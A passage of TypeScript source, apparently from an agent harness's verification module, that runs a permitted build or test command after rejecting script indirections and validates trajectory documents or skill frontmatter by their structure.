     runner is refused with the resolution named, even on the four-string list. */
  const chain = resolveRepoScript(cmd, repoRoot);
  if (chain !== null && chain.leaf !== null && !isRunnerScript(chain.leaf)) {
    return {
      status: 'failed',
      reason: `command "${cmd}" is an indirection: ${describeScriptChain(chain)} — not a build/test runner`,
    };
  }
  const parts = cmd.split(' ');
  const bin = parts[0]!;
  const args = parts.slice(1);
  const timeout = input.commandTimeoutMs ?? 120_000;
  const result = spawnVerifyBin(bin, args, { cwd: repoRoot, timeout });
  if (result.error) {
    return {
      status: 'failed',
      reason: `command failed to start: ${result.error.message}`,
      exitCode: result.status,
    };
  }
  if (result.status === 0) {
    return { status: 'passed' };
  }
  const stderr = (result.stderr ?? '').trim();
  const stdout = (result.stdout ?? '').trim();
  const detail = stderr || stdout || `exited ${String(result.status)}`;
  return {
    status: 'failed',
    reason: `command "${cmd}" failed: ${detail.slice(0, 500)}`,
    exitCode: result.status,
  };
}

/** Choose the validator by structural sniff and return its verdict. */
function runSchemaValidate(subject: unknown): VerifyResult {
  if (subject === undefined || subject === null) {
    return { status: 'failed', reason: 'schema-validate requires a subject' };
  }
  if (looksLikeTrajectoryDoc(subject)) {
    if (isTrajectoryDoc(subject)) {
      return { status: 'passed' };
    }
    return { status: 'failed', reason: 'trajectory doc failed structural validation' };
  }
  if (looksLikeSkillFrontmatter(subject)) {
    const errors = validateHarnessSkill(subject);
    if (errors.length === 0) {
      return { status: 'passed' };
    }
    return { status: 'failed', errors };
  }
  return {
    status: 'failed',
    reason: 'schema-validate subject is neither a trajectory doc nor a skill frontmatter',
  };
}

/** True when `s` structurally resembles a TrajectoryDoc (has `graph.runId`). */
function looksLikeTrajectoryDoc(s: unknown): boolean {
  if (!s || typeof s !== 'object') return false;
  const v = s as Record<string, unknown>;
  const g = v.graph;
  return !!g && typeof g === 'object' && typeof (g as Record<string, unknown>).runId === 'string';
}

/** True when `s` structurally resembles a skill frontmatter (has `evidenceRunIds`). */
function looksLikeSkillFrontmatter(s: unknown): s is HarnessSkillFrontmatter {
  if (!s || typeof s !== 'object') return false;
  return Array.isArray((s as Record<string, unknown>).evidenceRunIds);
}
